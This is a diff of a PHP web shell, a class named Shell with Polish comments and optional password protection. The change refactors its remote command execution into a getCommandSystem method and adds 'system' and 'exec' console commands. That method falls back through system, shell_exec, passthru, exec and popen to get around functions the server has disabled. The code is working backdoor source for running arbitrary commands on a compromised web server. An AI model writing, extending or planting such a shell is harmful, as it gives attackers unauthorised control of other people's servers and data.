@@ -29,6 +29,15 @@ class Shell
 	const VERSION = '0.21 b110618';
 
 	/**
+	 * Help, natywne polecenia
+	 */
+	const HELP = <<<'DATA'
+help - Wyświetlanie pomocy
+modules - Informacje o modułach
+system, exec - Uruchomienie polecenia systemowego
+DATA;
+
+	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
 	 *
 	 * format: sha1( $user . "\xff" . $pass );
@@ -353,7 +362,7 @@ class Shell
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<DATA
-modules - Dodatkowe moduły
+modules - Informacje o modułach
 
 	Użycie:
 		modules version - wyświetlanie wersji modułów
@@ -471,6 +480,10 @@ DATA;
 	private function getCommandHelp()
 	{
 		$iMaxLen = 0;
+
+		/**
+		 * Szukanie najdluzszego ciagu (najdluzsza lista komend)
+		 */
 		foreach( $this -> aHelpModules as $sModuleCmd )
 		{
 			if( ( $iLen = strlen( $sModuleCmd ) ) > $iMaxLen )
@@ -479,10 +492,22 @@ DATA;
 			}
 		}
 
-		/**
-		 * Szukanie najdluzszego ciagu
-		 */
 		$sOutput = NULL;
+
+		/**
+		 * Formatowanie natywnego helpa
+		 */
+		$aHelp = preg_split( '~\r\n~', self::HELP );
+		foreach( $aHelp as $sLine )
+		{
+			$iPos = strpos( $sLine, '-' );
+
+			$sOutput .= str_pad( substr( $sLine, 0, $iPos ), $iMaxLen, ' ' ) . rtrim( substr( $sLine, $iPos -  1 ) ) . "\r\n";
+		}
+
+		/**
+		 * Formatowanie helpow
+		 */
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
 			$oModule = new $sModule( $this );
@@ -496,7 +521,7 @@ DATA;
 		$sOutput .= "\r\n\r\n";
 
 		/**
-		 * Wyswietlanie naglowka
+		 * Naglowki
 		 */
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
@@ -506,6 +531,56 @@ DATA;
 		}
 
 		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
+	}
+
+	/**
+	 * Wykonanie polecenia systemowago
+	 *
+	 * @access public
+	 * @param  string $sCmd Komenda
+	 * @return string
+	 */
+	public function getCommandSystem( $sCmd )
+	{
+		if( ! $this -> bSafeMode )
+		{
+			ob_start();
+			if( ! in_array( 'system', $this -> aDisableFunctions ) )
+			{
+				system( $sCmd );
+			}
+			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
+			{
+				echo shell_exec( $sCmd );
+			}
+			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
+			{
+				passthru( $sCmd );
+			}
+			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
+			{
+				exec( $sCmd );
+			}
+			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
+			{
+				$rFp = popen( $sCmd, 'r' );
+				while( ! feof( $rFp ) )
+				{
+					echo fread( $rFp, 1024 );
+				}
+			}
+			else
+			{
+				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
+			}
+
+			$sData = ob_get_contents();
+			ob_clean();
+			ob_end_flush();
+			return htmlspecialchars( $sData );
+		}
+
+		return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
 	}
 
 	/**
@@ -608,6 +683,10 @@ DATA;
 				case 'cr3d1ts':
 					$sConsole = $this -> getCommandCr3d1ts();
 					break ;
+				case 'system':
+				case 'exec':
+					$sConsole = $this -> getCommandSystem( $this -> sArgv );
+					break ;
 				default :
 					if( $this -> aModules === array() )
 					{
@@ -640,51 +719,14 @@ DATA;
 		/**
 		 * Wykonanie komendy systemowej
 		 */
-		else if( ! $this -> bSafeMode )
-		{
-			ob_start();
-			if( ! in_array( 'system', $this -> aDisableFunctions ) )
-			{
-				system( $sCmd );
-			}
-			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
-			{
-				echo shell_exec( $sCmd );
-			}
-			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
-			{
-				passthru( $sCmd );
-			}
-			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
-			{
-				exec( $sCmd );
-			}
-			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
-			{
-				$rFp = popen( $sCmd, 'r' );
-				while( ! feof( $rFp ) )
-				{
-					echo fread( $rFp, 1024 );
-				}
-			}
-			else
-			{
-				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
-			}
-
-			$sData = ob_get_contents();
-			ob_clean();
-			ob_end_flush();
-			$sConsole = htmlspecialchars( $sData );
-		}
 		else
 		{
-			$sConsole = 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
+			$sConsole = $this -> getCommandSystem( $this -> sArgv );
 		}
 
 		if( $bRaw || ( PHP_SAPI === 'cli' ) )
 		{
-			return strip_tags( $sConsole ) . "\r\n";
+			return strip_tags( htmlspecialchars_decode( $sConsole ) ) . "\r\n";
 		}
 
 		$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
